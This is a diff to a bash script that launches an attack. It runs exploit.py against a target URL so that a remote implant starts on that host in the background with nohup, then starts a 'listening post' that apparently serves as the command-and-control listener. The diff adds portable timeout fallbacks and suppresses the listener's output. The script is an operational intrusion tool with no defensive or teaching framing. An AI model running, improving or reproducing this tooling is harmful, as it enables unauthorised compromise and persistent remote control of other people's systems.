@@ -1,5 +1,3 @@
-#!/bin/bash
-
 set -e
 
 PORT=8000
@@ -87,7 +85,19 @@ echo "[*] Stopping HTTP server..."
 kill $SERVER_PID 2>/dev/null || true
 
 echo "[*] Launching implant now..."
-timeout 5 bash -c "python3 exploit.py 'http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/' 'setsid nohup $REMOTE_IMPLANT >/dev/null 2>&1 &'" || true
+if command -v timeout >/dev/null 2>&1; then
+  TIMEOUT_CMD=timeout
+elif command -v gtimeout >/dev/null 2>&1; then
+  TIMEOUT_CMD=gtimeout
+else
+  TIMEOUT_CMD=""
+fi
+
+if [ -n "$TIMEOUT_CMD" ]; then
+  "$TIMEOUT_CMD" 5 bash -c "python3 exploit.py 'http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/' 'setsid nohup $REMOTE_IMPLANT >/dev/null 2>&1 &'" || true
+else
+  perl -e 'alarm shift; exec @ARGV' 5 bash -c "python3 exploit.py 'http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/' 'setsid nohup $REMOTE_IMPLANT >/dev/null 2>&1 &'" || true
+fi
 echo "[+] Implant is running."
 
 
@@ -96,7 +106,7 @@ if [ -n "$LISTENING_POST" ]; then
     LP_DIR=$(dirname "$LISTENING_POST")
     LP_FILE=$(basename "$LISTENING_POST")
     echo "[*] Starting listening post in $LP_DIR"
-    (cd "$LP_DIR" && python3 "$LP_FILE") &
+    (cd "$LP_DIR" && python3 "$LP_FILE" > /dev/null 2>&1 &) &
     LP_PID=$!
     sleep 3
 fi
